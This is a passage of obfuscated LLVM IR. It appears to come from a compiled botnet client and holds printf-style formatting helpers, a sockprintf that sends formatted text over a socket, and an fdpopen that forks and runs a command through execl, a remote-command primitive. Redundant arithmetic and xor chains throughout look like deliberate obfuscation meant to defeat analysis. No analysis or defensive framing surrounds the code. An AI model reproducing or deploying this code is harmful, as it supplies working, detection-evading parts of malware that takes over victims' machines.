  %200 = call i32 @printi(i8** %176, i32 %197, i32 16, i32 0, i32 %198, i32 %199, i32 97)
  %201 = load i32, i32* %9, align 4
  %202 = sub i32 0, %200
  %203 = sub i32 %201, %202
  %204 = add nsw i32 %201, %200
  store i32 %203, i32* %9, align 4
  br label %332

; <label>:205:                                    ; preds = %170
  %206 = load i8*, i8** %5, align 8
  %207 = load i8, i8* %206, align 1
  %208 = zext i8 %207 to i32
  %209 = icmp eq i32 %208, 88
  br i1 %209, label %210, label %242

; <label>:210:                                    ; preds = %205
  %211 = load i8**, i8*** %4, align 8
  %212 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %213 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %212, i32 0, i32 0
  %214 = load i32, i32* %213, align 8
  %215 = icmp ule i32 %214, 40
  br i1 %215, label %216, label %225

; <label>:216:                                    ; preds = %210
  %217 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %212, i32 0, i32 3
  %218 = load i8*, i8** %217, align 8
  %219 = getelementptr i8, i8* %218, i32 %214
  %220 = bitcast i8* %219 to i32*
  %221 = sub i32 %214, -1195989206
  %222 = add i32 %221, 8
  %223 = add i32 %222, -1195989206
  %224 = add i32 %214, 8
  store i32 %223, i32* %213, align 8
  br label %230

; <label>:225:                                    ; preds = %210
  %226 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %212, i32 0, i32 2
  %227 = load i8*, i8** %226, align 8
  %228 = bitcast i8* %227 to i32*
  %229 = getelementptr i8, i8* %227, i32 8
  store i8* %229, i8** %226, align 8
  br label %230

; <label>:230:                                    ; preds = %225, %216
  %231 = phi i32* [ %220, %216 ], [ %228, %225 ]
  %232 = load i32, i32* %231, align 4
  %233 = load i32, i32* %7, align 4
  %234 = load i32, i32* %8, align 4
  %235 = call i32 @printi(i8** %211, i32 %232, i32 16, i32 0, i32 %233, i32 %234, i32 65)
  %236 = load i32, i32* %9, align 4
  %237 = sub i32 0, %236
  %238 = sub i32 0, %235
  %239 = add i32 %237, %238
  %240 = sub i32 0, %239
  %241 = add nsw i32 %236, %235
  store i32 %240, i32* %9, align 4
  br label %332

; <label>:242:                                    ; preds = %205
  %243 = load i8*, i8** %5, align 8
  %244 = load i8, i8* %243, align 1
  %245 = zext i8 %244 to i32
  %246 = icmp eq i32 %245, 117
  br i1 %246, label %247, label %278

; <label>:247:                                    ; preds = %242
  %248 = load i8**, i8*** %4, align 8
  %249 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %250 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %249, i32 0, i32 0
  %251 = load i32, i32* %250, align 8
  %252 = icmp ule i32 %251, 40
  br i1 %252, label %253, label %261

; <label>:253:                                    ; preds = %247
  %254 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %249, i32 0, i32 3
  %255 = load i8*, i8** %254, align 8
  %256 = getelementptr i8, i8* %255, i32 %251
  %257 = bitcast i8* %256 to i32*
  %258 = sub i32 0, 8
  %259 = sub i32 %251, %258
  %260 = add i32 %251, 8
  store i32 %259, i32* %250, align 8
  br label %266

; <label>:261:                                    ; preds = %247
  %262 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %249, i32 0, i32 2
  %263 = load i8*, i8** %262, align 8
  %264 = bitcast i8* %263 to i32*
  %265 = getelementptr i8, i8* %263, i32 8
  store i8* %265, i8** %262, align 8
  br label %266

; <label>:266:                                    ; preds = %261, %253
  %267 = phi i32* [ %257, %253 ], [ %264, %261 ]
  %268 = load i32, i32* %267, align 4
  %269 = load i32, i32* %7, align 4
  %270 = load i32, i32* %8, align 4
  %271 = call i32 @printi(i8** %248, i32 %268, i32 10, i32 0, i32 %269, i32 %270, i32 97)
  %272 = load i32, i32* %9, align 4
  %273 = sub i32 0, %272
  %274 = sub i32 0, %271
  %275 = add i32 %273, %274
  %276 = sub i32 0, %275
  %277 = add nsw i32 %272, %271
  store i32 %276, i32* %9, align 4
  br label %332

; <label>:278:                                    ; preds = %242
  %279 = load i8*, i8** %5, align 8
  %280 = load i8, i8* %279, align 1
  %281 = zext i8 %280 to i32
  %282 = icmp eq i32 %281, 99
  br i1 %282, label %283, label %319

; <label>:283:                                    ; preds = %278
  %284 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %285 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %284, i32 0, i32 0
  %286 = load i32, i32* %285, align 8
  %287 = icmp ule i32 %286, 40
  br i1 %287, label %288, label %298

; <label>:288:                                    ; preds = %283
  %289 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %284, i32 0, i32 3
  %290 = load i8*, i8** %289, align 8
  %291 = getelementptr i8, i8* %290, i32 %286
  %292 = bitcast i8* %291 to i32*
  %293 = sub i32 0, %286
  %294 = sub i32 0, 8
  %295 = add i32 %293, %294
  %296 = sub i32 0, %295
  %297 = add i32 %286, 8
  store i32 %296, i32* %285, align 8
  br label %303

; <label>:298:                                    ; preds = %283
  %299 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %284, i32 0, i32 2
  %300 = load i8*, i8** %299, align 8
  %301 = bitcast i8* %300 to i32*
  %302 = getelementptr i8, i8* %300, i32 8
  store i8* %302, i8** %299, align 8
  br label %303

; <label>:303:                                    ; preds = %298, %288
  %304 = phi i32* [ %292, %288 ], [ %301, %298 ]
  %305 = load i32, i32* %304, align 4
  %306 = trunc i32 %305 to i8
  %307 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %306, i8* %307, align 1
  %308 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %308, align 1
  %309 = load i8**, i8*** %4, align 8
  %310 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %311 = load i32, i32* %7, align 4
  %312 = load i32, i32* %8, align 4
  %313 = call i32 @prints(i8** %309, i8* %310, i32 %311, i32 %312)
  %314 = load i32, i32* %9, align 4
  %315 = sub i32 %314, -353428467
  %316 = add i32 %315, %313
  %317 = add i32 %316, -353428467
  %318 = add nsw i32 %314, %313
  store i32 %317, i32* %9, align 4
  br label %332

; <label>:319:                                    ; preds = %278
  br label %331

; <label>:320:                                    ; preds = %17
  br label %321

; <label>:321:                                    ; preds = %320, %35
  %322 = load i8**, i8*** %4, align 8
  %323 = load i8*, i8** %5, align 8
  %324 = load i8, i8* %323, align 1
  %325 = zext i8 %324 to i32
  call void @printchar(i8** %322, i32 %325)
  %326 = load i32, i32* %9, align 4
  %327 = sub i32 %326, 1598804508
  %328 = add i32 %327, 1
  %329 = add i32 %328, 1598804508
  %330 = add nsw i32 %326, 1
  store i32 %329, i32* %9, align 4
  br label %331

; <label>:331:                                    ; preds = %321, %319
  br label %332

; <label>:332:                                    ; preds = %331, %303, %266, %230, %195, %160, %124
  %333 = load i8*, i8** %5, align 8
  %334 = getelementptr inbounds i8, i8* %333, i32 1
  store i8* %334, i8** %5, align 8
  br label %12

; <label>:335:                                    ; preds = %29, %12
  %336 = load i8**, i8*** %4, align 8
  %337 = icmp ne i8** %336, null
  br i1 %337, label %338, label %341

; <label>:338:                                    ; preds = %335
  %339 = load i8**, i8*** %4, align 8
  %340 = load i8*, i8** %339, align 8
  store i8 0, i8* %340, align 1
  br label %341

; <label>:341:                                    ; preds = %338, %335
  %342 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %343 = bitcast %struct.__va_list_tag* %342 to i8*
  call void @llvm.va_end(i8* %343)
  %344 = load i32, i32* %9, align 4
  ret i32 %344
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %13, 0
  br i1 %14, label %15, label %49

; <label>:15:                                     ; preds = %4
  store i32 0, i32* %11, align 4
  %16 = load i8*, i8** %6, align 8
  store i8* %16, i8** %12, align 8
  br label %17

; <label>:17:                                     ; preds = %26, %15
  %18 = load i8*, i8** %12, align 8
  %19 = load i8, i8* %18, align 1
  %20 = icmp ne i8 %19, 0
  br i1 %20, label %21, label %29

; <label>:21:                                     ; preds = %17
  %22 = load i32, i32* %11, align 4
  %23 = sub i32 0, 1
  %24 = sub i32 %22, %23
  %25 = add nsw i32 %22, 1
  store i32 %24, i32* %11, align 4
  br label %26

; <label>:26:                                     ; preds = %21
  %27 = load i8*, i8** %12, align 8
  %28 = getelementptr inbounds i8, i8* %27, i32 1
  store i8* %28, i8** %12, align 8
  br label %17

; <label>:29:                                     ; preds = %17
  %30 = load i32, i32* %11, align 4
  %31 = load i32, i32* %7, align 4
  %32 = icmp sge i32 %30, %31
  br i1 %32, label %33, label %34

; <label>:33:                                     ; preds = %29
  store i32 0, i32* %7, align 4
  br label %40

; <label>:34:                                     ; preds = %29
  %35 = load i32, i32* %11, align 4
  %36 = load i32, i32* %7, align 4
  %37 = sub i32 0, %35
  %38 = add i32 %36, %37
  %39 = sub nsw i32 %36, %35
  store i32 %38, i32* %7, align 4
  br label %40

; <label>:40:                                     ; preds = %34, %33
  %41 = load i32, i32* %8, align 4
  %42 = xor i32 2, -1
  %43 = xor i32 %41, %42
  %44 = and i32 %43, %41
  %45 = and i32 %41, 2
  %46 = icmp ne i32 %44, 0
  br i1 %46, label %47, label %48

; <label>:47:                                     ; preds = %40
  store i32 48, i32* %10, align 4
  br label %48

; <label>:48:                                     ; preds = %47, %40
  br label %49

; <label>:49:                                     ; preds = %48, %4
  %50 = load i32, i32* %8, align 4
  %51 = xor i32 %50, -1
  %52 = xor i32 1, -1
  %53 = xor i32 -1652397996, -1
  %54 = or i32 %51, %52
  %55 = or i32 -1652397996, %53
  %56 = xor i32 %54, -1
  %57 = and i32 %56, %55
  %58 = and i32 %50, 1
  %59 = icmp ne i32 %57, 0
  br i1 %59, label %81, label %60

; <label>:60:                                     ; preds = %49
  br label %61

; <label>:61:                                     ; preds = %73, %60
  %62 = load i32, i32* %7, align 4
  %63 = icmp sgt i32 %62, 0
  br i1 %63, label %64, label %80

; <label>:64:                                     ; preds = %61
  %65 = load i8**, i8*** %5, align 8
  %66 = load i32, i32* %10, align 4
  call void @printchar(i8** %65, i32 %66)
  %67 = load i32, i32* %9, align 4
  %68 = sub i32 0, %67
  %69 = sub i32 0, 1
  %70 = add i32 %68, %69
  %71 = sub i32 0, %70
  %72 = add nsw i32 %67, 1
  store i32 %71, i32* %9, align 4
  br label %73

; <label>:73:                                     ; preds = %64
  %74 = load i32, i32* %7, align 4
  %75 = sub i32 0, %74
  %76 = sub i32 0, -1
  %77 = add i32 %75, %76
  %78 = sub i32 0, %77
  %79 = add nsw i32 %74, -1
  store i32 %78, i32* %7, align 4
  br label %61

; <label>:80:                                     ; preds = %61
  br label %81

; <label>:81:                                     ; preds = %80, %49
  br label %82

; <label>:82:                                     ; preds = %95, %81
  %83 = load i8*, i8** %6, align 8
  %84 = load i8, i8* %83, align 1
  %85 = icmp ne i8 %84, 0
  br i1 %85, label %86, label %98

; <label>:86:                                     ; preds = %82
  %87 = load i8**, i8*** %5, align 8
  %88 = load i8*, i8** %6, align 8
  %89 = load i8, i8* %88, align 1
  %90 = zext i8 %89 to i32
  call void @printchar(i8** %87, i32 %90)
  %91 = load i32, i32* %9, align 4
  %92 = sub i32 0, 1
  %93 = sub i32 %91, %92
  %94 = add nsw i32 %91, 1
  store i32 %93, i32* %9, align 4
  br label %95

; <label>:95:                                     ; preds = %86
  %96 = load i8*, i8** %6, align 8
  %97 = getelementptr inbounds i8, i8* %96, i32 1
  store i8* %97, i8** %6, align 8
  br label %82

; <label>:98:                                     ; preds = %82
  br label %99

; <label>:99:                                     ; preds = %111, %98
  %100 = load i32, i32* %7, align 4
  %101 = icmp sgt i32 %100, 0
  br i1 %101, label %102, label %118

; <label>:102:                                    ; preds = %99
  %103 = load i8**, i8*** %5, align 8
  %104 = load i32, i32* %10, align 4
  call void @printchar(i8** %103, i32 %104)
  %105 = load i32, i32* %9, align 4
  %106 = sub i32 0, %105
  %107 = sub i32 0, 1
  %108 = add i32 %106, %107
  %109 = sub i32 0, %108
  %110 = add nsw i32 %105, 1
  store i32 %109, i32* %9, align 4
  br label %111

; <label>:111:                                    ; preds = %102
  %112 = load i32, i32* %7, align 4
  %113 = sub i32 0, %112
  %114 = sub i32 0, -1
  %115 = add i32 %113, %114
  %116 = sub i32 0, %115
  %117 = add nsw i32 %112, -1
  store i32 %116, i32* %7, align 4
  br label %99

; <label>:118:                                    ; preds = %99
  %119 = load i32, i32* %9, align 4
  ret i32 %119
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  %24 = icmp eq i32 %23, 0
  br i1 %24, label %25, label %33

; <label>:25:                                     ; preds = %7
  %26 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %26, align 1
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %27, align 1
  %28 = load i8**, i8*** %9, align 8
  %29 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %30 = load i32, i32* %13, align 4
  %31 = load i32, i32* %14, align 4
  %32 = call i32 @prints(i8** %28, i8* %29, i32 %30, i32 %31)
  store i32 %32, i32* %8, align 4
  br label %129

; <label>:33:                                     ; preds = %7
  %34 = load i32, i32* %12, align 4
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %48

; <label>:36:                                     ; preds = %33
  %37 = load i32, i32* %11, align 4
  %38 = icmp eq i32 %37, 10
  br i1 %38, label %39, label %48

; <label>:39:                                     ; preds = %36
  %40 = load i32, i32* %10, align 4
  %41 = icmp slt i32 %40, 0
  br i1 %41, label %42, label %48

; <label>:42:                                     ; preds = %39
  store i32 1, i32* %19, align 4
  %43 = load i32, i32* %10, align 4
  %44 = sub i32 0, 441472341
  %45 = sub i32 %44, %43
  %46 = add i32 %45, 441472341
  %47 = sub nsw i32 0, %43
  store i32 %46, i32* %21, align 4
  br label %48

; <label>:48:                                     ; preds = %42, %39, %36, %33
  %49 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %50 = getelementptr inbounds i8, i8* %49, i64 12
  %51 = getelementptr inbounds i8, i8* %50, i64 -1
  store i8* %51, i8** %17, align 8
  %52 = load i8*, i8** %17, align 8
  store i8 0, i8* %52, align 1
  br label %53

; <label>:53:                                     ; preds = %74, %48
  %54 = load i32, i32* %21, align 4
  %55 = icmp ne i32 %54, 0
  br i1 %55, label %56, label %86

; <label>:56:                                     ; preds = %53
  %57 = load i32, i32* %21, align 4
  %58 = load i32, i32* %11, align 4
  %59 = urem i32 %57, %58
  store i32 %59, i32* %18, align 4
  %60 = load i32, i32* %18, align 4
  %61 = icmp sge i32 %60, 10
  br i1 %61, label %62, label %74

; <label>:62:                                     ; preds = %56
  %63 = load i32, i32* %15, align 4
  %64 = sub i32 0, 48
  %65 = add i32 %63, %64
  %66 = sub nsw i32 %63, 48
  %67 = sub i32 0, 10
  %68 = add i32 %65, %67
  %69 = sub nsw i32 %65, 10
  %70 = load i32, i32* %18, align 4
  %71 = sub i32 0, %68
  %72 = sub i32 %70, %71
  %73 = add nsw i32 %70, %68
  store i32 %72, i32* %18, align 4
  br label %74

; <label>:74:                                     ; preds = %62, %56
  %75 = load i32, i32* %18, align 4
  %76 = add i32 %75, 297691843
  %77 = add i32 %76, 48
  %78 = sub i32 %77, 297691843
  %79 = add nsw i32 %75, 48
  %80 = trunc i32 %78 to i8
  %81 = load i8*, i8** %17, align 8
  %82 = getelementptr inbounds i8, i8* %81, i32 -1
  store i8* %82, i8** %17, align 8
  store i8 %80, i8* %82, align 1
  %83 = load i32, i32* %11, align 4
  %84 = load i32, i32* %21, align 4
  %85 = udiv i32 %84, %83
  store i32 %85, i32* %21, align 4
  br label %53

; <label>:86:                                     ; preds = %53
  %87 = load i32, i32* %19, align 4
  %88 = icmp ne i32 %87, 0
  br i1 %88, label %89, label %119

; <label>:89:                                     ; preds = %86
  %90 = load i32, i32* %13, align 4
  %91 = icmp ne i32 %90, 0
  br i1 %91, label %92, label %115

; <label>:92:                                     ; preds = %89
  %93 = load i32, i32* %14, align 4
  %94 = xor i32 %93, -1
  %95 = xor i32 2, -1
  %96 = xor i32 -490246450, -1
  %97 = or i32 %94, %95
  %98 = or i32 -490246450, %96
  %99 = xor i32 %97, -1
  %100 = and i32 %99, %98
  %101 = and i32 %93, 2
  %102 = icmp ne i32 %100, 0
  br i1 %102, label %103, label %115

; <label>:103:                                    ; preds = %92
  %104 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %104, i32 45)
  %105 = load i32, i32* %20, align 4
  %106 = sub i32 %105, -91795994
  %107 = add i32 %106, 1
  %108 = add i32 %107, -91795994
  %109 = add nsw i32 %105, 1
  store i32 %108, i32* %20, align 4
  %110 = load i32, i32* %13, align 4
  %111 = add i32 %110, 31160605
  %112 = add i32 %111, -1
  %113 = sub i32 %112, 31160605
  %114 = add nsw i32 %110, -1
  store i32 %113, i32* %13, align 4
  br label %118

; <label>:115:                                    ; preds = %92, %89
  %116 = load i8*, i8** %17, align 8
  %117 = getelementptr inbounds i8, i8* %116, i32 -1
  store i8* %117, i8** %17, align 8
  store i8 45, i8* %117, align 1
  br label %118

; <label>:118:                                    ; preds = %115, %103
  br label %119

; <label>:119:                                    ; preds = %118, %86
  %120 = load i32, i32* %20, align 4
  %121 = load i8**, i8*** %9, align 8
  %122 = load i8*, i8** %17, align 8
  %123 = load i32, i32* %13, align 4
  %124 = load i32, i32* %14, align 4
  %125 = call i32 @prints(i8** %121, i8* %122, i32 %123, i32 %124)
  %126 = sub i32 0, %125
  %127 = sub i32 %120, %126
  %128 = add nsw i32 %120, %125
  store i32 %127, i32* %8, align 4
  br label %129

; <label>:129:                                    ; preds = %119, %25
  %130 = load i32, i32* %8, align 4
  ret i32 %130
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  %6 = icmp ne i8** %5, null
  br i1 %6, label %7, label %15

; <label>:7:                                      ; preds = %2
  %8 = load i32, i32* %4, align 4
  %9 = trunc i32 %8 to i8
  %10 = load i8**, i8*** %3, align 8
  %11 = load i8*, i8** %10, align 8
  store i8 %9, i8* %11, align 1
  %12 = load i8**, i8*** %3, align 8
  %13 = load i8*, i8** %12, align 8
  %14 = getelementptr inbounds i8, i8* %13, i32 1
  store i8* %14, i8** %12, align 8
  br label %18

; <label>:15:                                     ; preds = %2
  %16 = bitcast i32* %4 to i8*
  %17 = call i64 @write(i32 1, i8* %16, i64 1)
  br label %18

; <label>:18:                                     ; preds = %15, %7
  ret void
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #2

declare i64 @write(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8*, ...) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %7 = bitcast %struct.__va_list_tag* %6 to i8*
  call void @llvm.va_start(i8* %7)
  %8 = load i8*, i8** %4, align 8
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %10 = call i32 @print(i8** %3, i8* %8, %struct.__va_list_tag* %9)
  ret i32 %10
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8*, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias i8* @malloc(i64 2048) #2
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 2048, i32 1, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %16 = call i32 @print(i8** %5, i8* %14, %struct.__va_list_tag* %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* %20) #10
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i32, i32* %3, align 4
  %24 = load i8*, i8** %6, align 8
  %25 = load i8*, i8** %6, align 8
  %26 = call i64 @strlen(i8* %25) #10
  %27 = call i64 @send(i32 %23, i8* %24, i64 %26, i32 16384)
  %28 = trunc i64 %27 to i32
  store i32 %28, i32* %8, align 4
  %29 = load i8*, i8** %6, align 8
  call void @free(i8* %29) #2
  %30 = load i32, i32* %8, align 4
  ret i32 %30
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #4

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

declare i64 @send(i32, i8*, i64, i32) #3

; Function Attrs: nounwind
declare void @free(i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @fdpopen(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca [2 x i32], align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  %13 = icmp ne i32 %12, 114
  br i1 %13, label %14, label %19

; <label>:14:                                     ; preds = %2
  %15 = load i8*, i8** %5, align 8
  %16 = load i8, i8* %15, align 1
  %17 = zext i8 %16 to i32
  %18 = icmp ne i32 %17, 119
  br i1 %18, label %25, label %19

; <label>:19:                                     ; preds = %14, %2
  %20 = load i8*, i8** %5, align 8
  %21 = getelementptr inbounds i8, i8* %20, i64 1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 0
  br i1 %24, label %25, label %26

; <label>:25:                                     ; preds = %19, %14
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:26:                                     ; preds = %19
  %27 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i32 0, i32 0
  %28 = call i32 @pipe(i32* %27) #2
  %29 = icmp slt i32 %28, 0
  br i1 %29, label %30, label %31

; <label>:30:                                     ; preds = %26
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:31:                                     ; preds = %26
  %32 = load i32*, i32** @fdopen_pids, align 8
  %33 = icmp eq i32* %32, null
  br i1 %33, label %34, label %54

; <label>:34:                                     ; preds = %31
  %35 = call i32 @getdtablesize() #2
  store i32 %35, i32* %8, align 4
  %36 = icmp sle i32 %35, 0
  br i1 %36, label %37, label %38

; <label>:37:                                     ; preds = %34
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:38:                                     ; preds = %34
  %39 = load i32, i32* %8, align 4
  %40 = sext i32 %39 to i64
  %41 = mul i64 %40, 4
  %42 = trunc i64 %41 to i32
  %43 = zext i32 %42 to i64
  %44 = call noalias i8* @malloc(i64 %43) #2
  %45 = bitcast i8* %44 to i32*
  store i32* %45, i32** @fdopen_pids, align 8
  %46 = icmp eq i32* %45, null
  br i1 %46, label %47, label %48

; <label>:47:                                     ; preds = %38
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:48:                                     ; preds = %38
  %49 = load i32*, i32** @fdopen_pids, align 8
  %50 = bitcast i32* %49 to i8*
  %51 = load i32, i32* %8, align 4
  %52 = sext i32 %51 to i64
  %53 = mul i64 %52, 4
  call void @llvm.memset.p0i8.i64(i8* %50, i8 0, i64 %53, i32 1, i1 false)
  br label %54

; <label>:54:                                     ; preds = %48, %31
  %55 = call i32 @vfork() #11
  store i32 %55, i32* %9, align 4
  switch i32 %55, label %101 [
    i32 -1, label %56
    i32 0, label %63
  ]

; <label>:56:                                     ; preds = %54
  %57 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %58 = load i32, i32* %57, align 4
  %59 = call i32 @close(i32 %58)
  %60 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %61 = load i32, i32* %60, align 4
  %62 = call i32 @close(i32 %61)
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:63:                                     ; preds = %54
  %64 = load i8*, i8** %5, align 8
  %65 = load i8, i8* %64, align 1
  %66 = zext i8 %65 to i32
  %67 = icmp eq i32 %66, 114
  br i1 %67, label %68, label %83

; <label>:68:                                     ; preds = %63
  %69 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %70 = load i32, i32* %69, align 4
  %71 = icmp ne i32 %70, 1
  br i1 %71, label %72, label %79

; <label>:72:                                     ; preds = %68
  %73 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %74 = load i32, i32* %73, align 4
  %75 = call i32 @dup2(i32 %74, i32 1) #2
  %76 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %77 = load i32, i32* %76, align 4
  %78 = call i32 @close(i32 %77)
  br label %79

; <label>:79:                                     ; preds = %72, %68
  %80 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %81 = load i32, i32* %80, align 4
  %82 = call i32 @close(i32 %81)
  br label %98

; <label>:83:                                     ; preds = %63
  %84 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %85 = load i32, i32* %84, align 4
  %86 = icmp ne i32 %85, 0
  br i1 %86, label %87, label %94

; <label>:87:                                     ; preds = %83
  %88 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %89 = load i32, i32* %88, align 4
  %90 = call i32 @dup2(i32 %89, i32 0) #2
  %91 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %92 = load i32, i32* %91, align 4
  %93 = call i32 @close(i32 %92)
  br label %94

; <label>:94:                                     ; preds = %87, %83
  %95 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %96 = load i32, i32* %95, align 4
  %97 = call i32 @close(i32 %96)
  br label %98

; <label>:98:                                     ; preds = %94, %79
  %99 = load i8*, i8** %4, align 8
  %100 = call i32 (i8*, i8*, ...) @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.304, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.305, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.306, i32 0, i32 0), i8* %99, i8* null) #2
  call void @_exit(i32 127) #12
  unreachable

; <label>:101:                                    ; preds = %54
  %102 = load i8*, i8** %5, align 8
  %103 = load i8, i8* %102, align 1
  %104 = zext i8 %103 to i32
  %105 = icmp eq i32 %104, 114
  br i1 %105, label %106, label %112

; <label>:106:                                    ; preds = %101
  %107 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %108 = load i32, i32* %107, align 4
  store i32 %108, i32* %6, align 4
  %109 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %110 = load i32, i32* %109, align 4
  %111 = call i32 @close(i32 %110)
  br label %118

; <label>:112:                                    ; preds = %101
  %113 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
